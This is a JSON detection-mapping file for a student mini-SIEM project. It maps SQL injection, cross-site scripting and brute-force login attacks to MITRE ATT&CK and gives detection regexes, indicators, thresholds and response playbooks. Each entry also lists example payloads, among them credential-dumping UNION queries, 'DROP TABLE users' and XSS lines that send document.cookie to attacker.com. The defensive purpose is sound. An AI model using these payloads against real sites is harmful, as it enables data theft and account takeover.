@@ -1,0 +1,397 @@
+{
+  "version": "1.0",
+  "last_updated": "2026-05-04",
+  "author": "Ilyas Ajelyan - Mini-SOC PFA Project",
+  "description": "Core intelligence layer for the Mini-SIEM detection engine. This file maps web attack patterns to MITRE ATT&CK techniques and provides detection logic, enrichment data, and response guidance for use by mini_siem.py.",
+  "attacks": {
+    "SQLi": {
+      "attack_name": "SQL Injection",
+      "mitre_id": "T1190",
+      "tactic": "Initial Access",
+      "technique": "Exploit Public-Facing Application",
+      "sub_technique": null,
+      "severity": "CRITICAL",
+      "description": "SQL Injection (SQLi) is an attack technique where an adversary inserts or manipulates SQL queries in user-controlled input fields to interact directly with the backend database. On Atlas MiniShop, vulnerable parameters in search.php, login.php, product.php and track_order.php are primary attack surfaces.",
+      "how_it_works": "The attacker submits crafted SQL syntax through HTTP GET/POST parameters or headers. If the application does not sanitize input, the injected SQL is parsed and executed by the database engine (MySQL). This allows the attacker to bypass authentication, extract data from tables, modify or delete records, and in some cases execute OS commands via database functions such as xp_cmdshell (MSSQL) or MySQL FILE/OUTFILE.",
+      "attacker_goal": "Data exfiltration (credentials, personal data, order history), authentication bypass (admin login), database enumeration (table names, column names), lateral movement, and potentially full server compromise via advanced SQLi techniques.",
+      "real_world_impact": "Full compromise of user data including passwords, credit card information, and PII. Authentication bypass granting admin access. Destruction or modification of database records. Legal, financial, and reputational consequences for the organization.",
+      "ioc": {
+        "payload_patterns": [
+          "Single quote injection: ' or ''",
+          "Boolean-based: OR 1=1, AND 1=2, OR 'a'='a'",
+          "Comment sequences: --, #, /**/",
+          "UNION-based: UNION SELECT, UNION ALL SELECT",
+          "Time-based blind: SLEEP(5), WAITFOR DELAY, BENCHMARK()",
+          "Error-based: EXTRACTVALUE(), UPDATEXML(), CONVERT()",
+          "Stacked queries: ; DROP TABLE, ; INSERT INTO",
+          "Hex encoding: 0x3127, CHAR(39)",
+          "Information schema: information_schema.tables, sys.tables",
+          "Database fingerprinting: @@version, VERSION(), user(), database()"
+        ],
+        "behavioral_indicators": [
+          "Unusually long parameter values containing SQL keywords",
+          "Repeated requests to the same endpoint with varying payloads",
+          "HTTP 500 responses indicating database errors triggered by injection",
+          "Requests containing encoded characters: %27 ('), %22 (\"), %23 (#), %2D%2D (--)",
+          "Abnormal response times suggesting SLEEP() or BENCHMARK() injection",
+          "Sequential numeric ID scanning: ?id=1, ?id=2, ?id=3...",
+          "Multiple requests with UNION and increasing column counts",
+          "Requests originating from automated tools (sqlmap, havij) User-Agents"
+        ],
+        "suspicious_headers_or_user_agents": [
+          "sqlmap/1.",
+          "Havij",
+          "BSQLINJECTOR",
+          "SQLi-Hunter",
+          "Pangolin",
+          "curl/",
+          "python-requests/",
+          "libwww-perl/"
+        ]
+      },
+      "detection_logic": {
+        "regex_patterns": [
+          "(?i)(\\%27|'|\\%22|\\\"|\\%60|`)\\s*(or|and|xor|not)\\s*['\"`]?\\s*\\d+\\s*[=<>]",
+          "(?i)(union\\s+(all\\s+)?select)",
+          "(?i)(select\\s+.+\\s+from\\s+)",
+          "(?i)(insert\\s+into\\s+|update\\s+.+\\s+set\\s+|delete\\s+from\\s+)",
+          "(?i)(drop\\s+(table|database|schema|column|index))",
+          "(?i)(sleep\\s*\\(\\s*\\d+\\s*\\)|waitfor\\s+delay|benchmark\\s*\\()",
+          "(?i)(extractvalue\\s*\\(|updatexml\\s*\\(|exp\\s*\\(\\s*~)",
+          "(?i)(information_schema|sysobjects|syscolumns|sys\\.tables)",
+          "(?i)(@@version|@@datadir|@@hostname|user\\s*\\(\\s*\\)|database\\s*\\(\\s*\\))",
+          "(?i)(0x[0-9a-f]{2,}|char\\s*\\(\\s*\\d+)",
+          "(?i)(\\%27|'|\\%22|\")(\\s*)(--|\\/\\*|#)",
+          "(?i)(or\\s+['\"]?[a-z0-9]+['\"]?\\s*=\\s*['\"]?[a-z0-9]+)",
+          "(?i)(load_file\\s*\\(|into\\s+(outfile|dumpfile))",
+          "(?i)(exec(ute)?\\s*(\\s+|\\()\\s*(xp_|sp_))"
+        ],
+        "behavioral_rules": [
+          "Flag any parameter containing SQL reserved keywords combined with comparison operators",
+          "Flag any request where the response time exceeds 4000ms (potential SLEEP injection)",
+          "Flag any HTTP 500 response on pages with GET/POST parameters (database error disclosure)",
+          "Flag requests containing URL-encoded SQL metacharacters: %27, %22, %3D, %2D%2D",
+          "Flag sequential GET requests to the same page differing only by an incrementing numeric ID"
+        ],
+        "thresholds": {
+          "requests_per_minute": 30,
+          "error_responses_per_minute": 10,
+          "unique_payloads_per_session": 5,
+          "response_time_ms_anomaly": 4000
+        }
+      },
+      "recommended_response": {
+        "immediate_actions": [
+          "Block source IP at the firewall or WAF immediately",
+          "Revoke any session tokens associated with the source IP",
+          "Capture and preserve all HTTP logs from the source IP for forensic analysis",
+          "Alert the DBA to audit recent database queries for unauthorized access or data changes",
+          "Check if any sensitive tables (users, orders, payments) have been accessed or dumped"
+        ],
+        "investigation_steps": [
+          "Identify the first occurrence of SQLi payload from this IP in http_logs",
+          "Reconstruct the full attack session: all URLs, parameters, response codes and timestamps",
+          "Determine if authentication was bypassed: check for 200 responses on login.php with SQLi payloads",
+          "Check database audit logs for unexpected SELECT, UNION, or DROP statements",
+          "Identify which tables and columns were targeted using the UNION SELECT column count pattern",
+          "Check for exfiltration signs: large HTTP response bodies returned after injection",
+          "Correlate source IP with threat intelligence feeds (known scanners, Tor exit nodes, VPNs)",
+          "Inspect user_agent field: automated tools like sqlmap have distinctive signatures"
+        ],
+        "long_term_fix": [
+          "Implement prepared statements and parameterized queries across all database interactions",
+          "Deploy a Web Application Firewall (WAF) with SQLi rule sets (ModSecurity CRS)",
+          "Apply input validation: whitelist expected input formats and reject anomalies",
+          "Disable verbose database error messages in production (custom error pages only)",
+          "Apply principle of least privilege to database accounts used by the application",
+          "Conduct regular DAST (Dynamic Application Security Testing) scans",
+          "Enable MySQL query logging and monitor for anomalous patterns"
+        ]
+      },
+      "response_reasoning": "SQL Injection is rated CRITICAL because it can directly compromise the confidentiality, integrity, and availability of the entire database without requiring any authentication. A single successful injection can expose all user credentials, financial records, and application data. Immediate IP blocking is warranted because continued access enables multi-stage enumeration. The investigation must determine scope before patching to understand if data was already exfiltrated.",
+      "example_payloads": [
+        "' OR '1'='1",
+        "' OR 1=1 --",
+        "admin'--",
+        "' UNION SELECT null, username, password FROM users --",
+        "1' AND SLEEP(5)--",
+        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--",
+        "'; DROP TABLE users;--",
+        "1 ORDER BY 5--",
+        "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--",
+        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))abc)--"
+      ],
+      "false_positive_notes": [
+        "Legitimate search queries containing apostrophes (e.g., searching for \"O'Brien\" or \"it's\")",
+        "Developers testing the application locally from a known IP",
+        "Security scanners running authorized penetration tests",
+        "Mitigation: Whitelist developer and scanner IPs, tune regex to require combination of multiple indicators before alerting CRITICAL"
+      ]
+    },
+    "XSS": {
+      "attack_name": "Cross-Site Scripting",
+      "mitre_id": "T1059.007",
+      "tactic": "Execution",
+      "technique": "Command and Scripting Interpreter: JavaScript",
+      "sub_technique": "T1059.007",
+      "severity": "HIGH",
+      "description": "Cross-Site Scripting (XSS) is an injection attack where malicious JavaScript is embedded into a web page viewed by other users. On Atlas MiniShop, stored XSS is the primary risk via review.php and the comment/product review features. Reflected XSS may also occur via search.php and track_order.php query parameters.",
+      "how_it_works": "The attacker submits a payload containing JavaScript code through a form field, URL parameter, or header that the application stores in the database (Stored XSS) or reflects directly in the HTTP response (Reflected XSS). When a victim visits the page, the browser executes the injected script in the context of the legitimate website's origin, bypassing the Same-Origin Policy. DOM-based XSS occurs when client-side JavaScript dynamically writes attacker-controlled data to the DOM without sanitization.",
+      "attacker_goal": "Session hijacking via document.cookie theft, credential harvesting via fake login forms, keylogging, malware distribution via drive-by download redirects, defacement, BeEF hooking for browser exploitation, and reconnaissance of the victim's browser environment.",
+      "real_world_impact": "Full account takeover of any user who views the infected page. Admin account compromise if an administrator views the stored XSS payload. Mass session theft in a shared environment. Reputational damage from visible defacement. Distribution of malware to application users.",
+      "ioc": {
+        "payload_patterns": [
+          "Script tag variants: <script>, <SCRIPT>, <scRiPt>, <script/>, </script>",
+          "Event handler injection: onerror=, onload=, onmouseover=, onfocus=, onclick=",
+          "JavaScript URI: javascript:, vbscript:, data:text/html",
+          "Template injection attempts: {{7*7}}, ${7*7}, #{7*7}",
+          "HTML entity bypass: &lt;script&gt;, &#x3C;script&#x3E;",
+          "Cookie access patterns: document.cookie, document['cookie']",
+          "DOM manipulation: document.write, innerHTML, outerHTML",
+          "Fetch/XHR exfiltration: fetch(, XMLHttpRequest, new Image().src",
+          "Obfuscation: eval(, atob(, String.fromCharCode(, unescape(",
+          "SVG XSS: <svg onload=, <svg/onload=",
+          "IMG tag: <img src=x onerror=, <img/src=1/onerror="
+        ],
+        "behavioral_indicators": [
+          "Submission of HTML tags in text input fields (reviews, search, comments)",
+          "Parameters containing JavaScript keywords: alert, eval, document, window, location",
+          "Encoded angle brackets in parameters: %3C (>), %3E (<), %22 (\")",
+          "Unusually long input in review or comment fields (obfuscated payloads)",
+          "Multiple rapid submissions of the same form with varying payloads (fuzzing)",
+          "Requests containing base64 encoded strings in input parameters"
+        ],
+        "suspicious_headers_or_user_agents": [
+          "Burp Suite",
+          "OWASP ZAP",
+          "XSSer",
+          "DalFox",
+          "w3af",
+          "python-requests/",
+          "curl/"
+        ]
+      },
+      "detection_logic": {
+        "regex_patterns": [
+          "(?i)<\\s*script[\\s>]",
+          "(?i)<\\/\\s*script\\s*>",
+          "(?i)<\\s*(img|svg|iframe|body|input|button|video|audio|source|track|details|object|embed)[^>]+(onerror|onload|onmouseover|onfocus|onclick|onmouseenter|onmouseleave|oninput|onchange|ondragover|ondragexit)\\s*=",
+          "(?i)(javascript|vbscript)\\s*:",
+          "(?i)document\\s*\\.\\s*(cookie|write|location|getElementById|querySelector)",
+          "(?i)(eval|setTimeout|setInterval)\\s*\\(",
+          "(?i)(alert|confirm|prompt)\\s*\\(",
+          "(?i)<\\s*svg[^>]*(onload|onerror)\\s*=",
+          "(?i)(&#x[0-9a-f]+;|&lt;|&gt;|&amp;|&quot;|&#[0-9]+;).*script",
+          "(?i)(atob|btoa|unescape|decodeURIComponent)\\s*\\(",
+          "(?i)String\\.fromCharCode\\s*\\(",
+          "(?i)fetch\\s*\\(|XMLHttpRequest|new\\s+Image\\s*\\(\\s*\\)\\.src",
+          "(?i)<\\s*(script|img|svg|iframe)[^>]+(src|href)\\s*=\\s*['\"]?(https?:|data:|javascript:)",
+          "(?i)(\\%3C|<)(\\%73|s)(\\%63|c)(\\%72|r)(\\%69|i)(\\%70|p)(\\%74|t)"
+        ],
+        "behavioral_rules": [
+          "Flag any text submitted to review.php, search.php, or comment fields containing HTML tags",
+          "Flag any input containing both angle brackets and JavaScript event handler keywords",
+          "Flag repeated form submissions with systematic variation of HTML/JS payloads (XSS fuzzing)",
+          "Flag any stored content that, when retrieved, contains unencoded script tags",
+          "Cross-reference user_agent against known XSS scanner signatures"
+        ],
+        "thresholds": {
+          "xss_attempts_per_session": 3,
+          "encoded_chars_ratio_in_param": 0.3,
+          "max_review_field_length_anomaly": 500
+        }
+      },
+      "recommended_response": {
+        "immediate_actions": [
+          "If Stored XSS is confirmed: immediately remove or sanitize the malicious content from the database",
+          "Invalidate all active user sessions to prevent hijacking of already-stolen cookies",
+          "Block the source IP at the network perimeter",
+          "Notify affected users to change passwords as a precautionary measure",
+          "Check server logs for any successful exfiltration requests (e.g., external fetch/XHR to attacker-controlled domains)"
+        ],
+        "investigation_steps": [
+          "Identify which field was exploited and which page stores or reflects the payload",
+          "Query the database for all entries containing script tags, event handlers, or javascript: URIs",
+          "Determine if the payload was Stored, Reflected, or DOM-based",
+          "Identify all users who may have viewed the infected page since the payload was submitted",
+          "Check web server access logs for outbound requests to external domains originating from browser-executed scripts",
+          "Review admin activity logs: determine if any admin viewed the infected content (highest risk scenario)",
+          "Correlate with session anomalies: accounts logged in from unexpected IPs after the XSS timestamp"
+        ],
+        "long_term_fix": [
+          "Implement output encoding for all dynamic content rendered in HTML, JavaScript, CSS and URL contexts",
+          "Apply Content Security Policy (CSP) headers: restrict script sources to trusted origins only",
+          "Use HTTPOnly and Secure flags on all session cookies to prevent JavaScript access",
+          "Implement a strict allowlist-based input validation for all user-submitted fields",
+          "Use modern frameworks (React, Vue) that auto-escape output by default",
+          "Run DAST scans specifically targeting XSS on all input surfaces",
+          "Sanitize stored content before rendering using a trusted library (DOMPurify, OWASP Java HTML Sanitizer)"
+        ]
+      },
+      "response_reasoning": "XSS is rated HIGH because while it does not directly compromise the server, it enables full client-side account takeover for every user who views the malicious content. Stored XSS on a page visited frequently by administrators is particularly dangerous as it can escalate to administrative account compromise. Session invalidation is an immediate priority because stolen tokens may already be in use by the attacker during the investigation window.",
+      "example_payloads": [
+        "<script>alert('XSS')</script>",
+        "<img src=x onerror=alert(document.cookie)>",
+        "<svg onload=fetch('https://attacker.com/?c='+document.cookie)>",
+        "javascript:alert(1)",
+        "<body onload=document.location='http://attacker.com/?'+document.cookie>",
+        "<iframe src=javascript:alert(1)>",
+        "\"><script>document.write('<img src=http://attacker.com/?'+document.cookie+'>')</script>",
+        "<input onfocus=eval(atob('YWxlcnQoMSk=')) autofocus>",
+        "{{constructor.constructor('alert(1)')()}}",
+        "<details open ontoggle=alert(1)>"
+      ],
+      "false_positive_notes": [
+        "Developers submitting HTML content in CMS or rich text fields",
+        "Security researchers running authorized scans",
+        "Users pasting HTML from other sources into review fields without malicious intent",
+        "Mitigation: Implement HTMLEntity encoding for storage, use context-aware output encoding for rendering, whitelist known developer IPs from HIGH severity escalation"
+      ]
+    },
+    "BruteForce": {
+      "attack_name": "Brute Force - Credential Access",
+      "mitre_id": "T1110",
+      "tactic": "Credential Access",
+      "technique": "Brute Force",
+      "sub_technique": "T1110.001 - Password Guessing / T1110.003 - Password Spraying",
+      "severity": "HIGH",
+      "description": "Brute Force attacks involve systematically submitting large numbers of credential combinations to an authentication endpoint in order to guess valid credentials. On Atlas MiniShop, the primary target is login.php. The attacker may use dictionary attacks (common password lists), credential stuffing (leaked credential pairs), or pure brute force (all character combinations).",
+      "how_it_works": "The attacker sends automated HTTP POST requests to login.php with varying username/password combinations. Tools such as Hydra, Medusa, Burp Intruder, or custom scripts submit hundreds to thousands of requests per minute. The attacker identifies a successful login by monitoring for HTTP 302 redirects, 200 responses with session cookies, or the absence of an error message in the response body.",
+      "attacker_goal": "Obtain valid credentials for any user account, prioritizing administrator accounts. Once authenticated, the attacker can access personal data, abuse account privileges, pivot to other systems, exfiltrate orders or payment information, or modify the application (in the case of admin access).",
+      "real_world_impact": "Unauthorized access to user accounts leading to privacy violations, fraud, and data theft. Administrator account compromise resulting in full application takeover. Denial of service on the login endpoint if rate not limited (resource exhaustion). Account lockout of legitimate users as collateral damage in lock-based mitigation systems.",
+      "ioc": {
+        "payload_patterns": [
+          "Repeated POST requests to login.php with different password values",
+          "Common passwords in POST body: password, 123456, admin, letmein, qwerty, pass",
+          "Credential stuffing patterns: username matches known leaked email formats",
+          "Sequential username enumeration attempts",
+          "High-frequency requests: more than 10 login attempts per minute from one IP"
+        ],
+        "behavioral_indicators": [
+          "5 or more failed login attempts (HTTP 200 with error message or HTTP 401/403) from the same IP within 60 seconds",
+          "Same IP targeting multiple different usernames (password spraying)",
+          "Same password tried across multiple usernames (horizontal brute force)",
+          "Requests with identical POST structure but varying only the password field",
+          "Missing or consistent User-Agent across all attempts (bot behavior)",
+          "No referrer header or consistent automated referrer",
+          "Requests arriving at inhuman speed: less than 100ms between attempts",
+          "Login attempts outside normal business hours or from geographically unusual IPs"
+        ],
+        "suspicious_headers_or_user_agents": [
+          "Hydra",
+          "Medusa",
+          "Ncrack",
+          "python-requests/",
+          "Go-http-client/",
+          "curl/",
+          "libwww-perl/",
+          "masscan",
+          "WFuzz"
+        ]
+      },
+      "detection_logic": {
+        "regex_patterns": [
+          "(?i)POST\\s+/login\\.php",
+          "(?i)(username|user|email|login)\\s*=\\s*[^&]+&(password|pass|pwd)\\s*=",
+          "(?i)(password|pass|pwd)=.*(123456|admin|password|letmein|qwerty|monkey|dragon|master|abc123|welcome|login)",
+          "(?i)Content-Type:\\s*application\\/x-www-form-urlencoded"
+        ],
+        "behavioral_rules": [
+          "Count POST requests to login.php per source IP within a 60-second sliding window; alert if count >= 5",
+          "Count distinct passwords tried by the same IP; alert if > 3 unique passwords per minute",
+          "Count distinct usernames tried by the same IP; alert if > 3 unique usernames (spraying pattern)",
+          "Alert if same IP has >= 5 consecutive HTTP responses matching failed login pattern (200 with error body or 401/403)",
+          "Compare inter-request timing: flag if average time between login POST requests from same IP < 500ms",
+          "Flag if User-Agent matches known brute force tool signatures"
+        ],
+        "thresholds": {
+          "failed_attempts_per_ip_per_window": 5,
+          "window_seconds": 60,
+          "lockout_threshold": 10,
+          "min_inter_request_ms": 500,
+          "unique_passwords_before_alert": 3,
+          "unique_usernames_before_spray_alert": 3
+        }
+      },
+      "recommended_response": {
+        "immediate_actions": [
+          "Temporarily block the source IP at the application layer or firewall",
+          "Temporarily lock any accounts targeted by more than 10 failed attempts",
+          "Force password reset on accounts that received the highest number of attempts",
+          "Invalidate all active sessions for targeted accounts as a precaution",
+          "Alert the account owner(s) of the attack attempt via email if contact info is available"
+        ],
+        "investigation_steps": [
+          "Determine the total number of attempts, start time, end time, and targeted usernames",
+          "Check if any attempts succeeded: look for HTTP 302 or session cookie issuance following a POST to login.php",
+          "If a successful login is found: identify what actions were taken in that session immediately after",
+          "Correlate the source IP with threat intelligence: is it a known scanner, Tor exit node, or VPN?",
+          "Identify the tool used based on User-Agent header and request timing patterns",
+          "Check if multiple IPs conducted coordinated low-rate attempts (distributed brute force to evade threshold)",
+          "Review whether valid usernames were successfully enumerated before the brute force (prior reconnaissance)"
+        ],
+        "long_term_fix": [
+          "Implement account lockout policy: lock account after 5 failed attempts for 15 minutes",
+          "Deploy CAPTCHA on login.php after 3 failed attempts from the same session",
+          "Implement IP-based rate limiting on login.php: maximum 10 requests per minute per IP",
+          "Enable multi-factor authentication (MFA/2FA) for all accounts, especially administrator",
+          "Use login attempt anomaly detection: flag logins from new IPs, new geolocations, or unusual hours",
+          "Hide username enumeration: return identical error messages for invalid username and invalid password",
+          "Monitor for credential stuffing using HaveIBeenPwned API integration",
+          "Log and monitor all authentication events with full context: IP, User-Agent, timestamp, success/failure"
+        ]
+      },
+      "response_reasoning": "Brute Force is rated HIGH because automated tools can attempt thousands of credential combinations in minutes against an unprotected login endpoint. A single successful guess grants the attacker full authenticated access to a user account. The risk escalates to CRITICAL if administrator credentials are targeted. Detection must be behavioral (counting attempts over time) rather than pattern-based, since individual login requests appear legitimate in isolation. IP blocking provides immediate relief but distributed attacks may require additional controls such as CAPTCHA and MFA.",
+      "example_payloads": [
+        "POST /login.php: username=admin&password=admin",
+        "POST /login.php: username=admin&password=123456",
+        "POST /login.php: username=admin&password=password",
+        "POST /login.php: username=admin&password=admin123",
+        "POST /login.php: username=test@example.com&password=letmein",
+        "POST /login.php: username=admin&password=qwerty",
+        "POST /login.php: username=administrator&password=P@ssw0rd",
+        "POST /login.php: username=admin&password=<from rockyou.txt wordlist iteration>"
+      ],
+      "false_positive_notes": [
+        "Legitimate users who have forgotten their password and retry multiple times",
+        "Automated monitoring tools or health-check scripts that authenticate periodically",
+        "Password managers that may retry on failure",
+        "Developers testing the login form in rapid succession during development",
+        "Mitigation: Whitelist known monitoring system IPs, set alert threshold to 5 attempts before alerting rather than immediate block, distinguish between slow human retries (>2s apart) and automated attacks (<500ms apart)"
+      ]
+    }
+  },
+  "severity_matrix": {
+    "CRITICAL": {
+      "level": 4,
+      "label": "CRITICAL",
+      "description": "Immediate threat to data integrity, confidentiality or availability. Requires immediate response.",
+      "sla_response_minutes": 15
+    },
+    "HIGH": {
+      "level": 3,
+      "label": "HIGH",
+      "description": "Probable attack with significant impact potential. Requires response within the hour.",
+      "sla_response_minutes": 60
+    },
+    "MEDIUM": {
+      "level": 2,
+      "label": "MEDIUM",
+      "description": "Suspicious activity requiring investigation. May be a precursor to a more serious attack.",
+      "sla_response_minutes": 240
+    },
+    "LOW": {
+      "level": 1,
+      "label": "LOW",
+      "description": "Mildly anomalous behavior. Log and monitor. Low immediate risk.",
+      "sla_response_minutes": 1440
+    }
+  },
+  "python_usage_guide": {
+    "load_mapping": "import json\nwith open('mitre_mapping.json', 'r') as f:\n    mitre_map = json.load(f)\nattacks = mitre_map['attacks']",
+    "get_attack_info": "sqli_info = attacks['SQLi']\nmitre_id = sqli_info['mitre_id']\nseverity = sqli_info['severity']\nresponse = sqli_info['recommended_response']['immediate_actions']",
+    "get_regex_patterns": "import re\npatterns = attacks['SQLi']['detection_logic']['regex_patterns']\nfor pattern in patterns:\n    if re.search(pattern, payload):\n        # Attack detected\n        break",
+    "get_thresholds": "bf_threshold = attacks['BruteForce']['detection_logic']['thresholds']['failed_attempts_per_ip_per_window']\nbf_window = attacks['BruteForce']['detection_logic']['thresholds']['window_seconds']",
+    "check_user_agent": "suspicious_agents = attacks['SQLi']['ioc']['suspicious_headers_or_user_agents']\nif any(agent.lower() in user_agent.lower() for agent in suspicious_agents):\n    # Flag suspicious tool"
+  }
+}
